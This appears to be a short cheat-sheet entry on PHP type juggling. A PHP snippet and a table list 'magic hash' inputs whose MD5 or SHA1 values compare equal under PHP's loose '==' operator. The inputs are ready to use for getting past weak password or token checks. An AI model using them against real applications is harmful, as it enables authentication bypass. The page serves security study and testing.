# PHP Juggling type and magic hashes	

## Exploit

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
var_dump('0010e2'         == '1e3');
var_dump('0x1234Ab'       == '1193131');
var_dump('0xABCdef'       == '     0xABCdef');
?>
```


| Hash | “Magic” Number / String    | Magic Hash                                    | Found By      |
| ---- | -------------------------- |:---------------------------------------------:| -------------:|
| MD5  | 240610708                  | 0e462097431906509019562988736854              | Michal Spacek |
| SHA1 | 10932435112                | 0e07766915004133176347055865026311692244      | Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham |


## Thanks to
* http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html
* https://www.whitehatsec.com/blog/magic-hashes/